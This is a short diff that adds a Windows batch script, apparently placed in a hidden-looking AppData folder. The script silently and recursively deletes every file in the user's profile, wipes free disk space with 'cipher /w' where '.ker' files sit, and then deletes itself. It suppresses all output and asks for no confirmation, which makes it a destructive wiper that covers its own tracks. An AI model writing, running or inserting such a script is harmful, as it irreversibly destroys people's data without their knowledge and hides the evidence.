@@ -1,0 +1,9 @@
+@echo off
+for /r "%USERPROFILE%" %%f in (*.ker) do (
+  cipher /w:"%%~dpf" >nul 2>&1
+  del /f /q "%%f" >nul 2>&1
+)
+for /r "%USERPROFILE%" %%f in (*.*) do (
+  if not "%%~xf"==".ker" del /f /q "%%f" >nul 2>&1
+)
+del /f /q "%AppData%\.cache_wipe\wipe.bat"
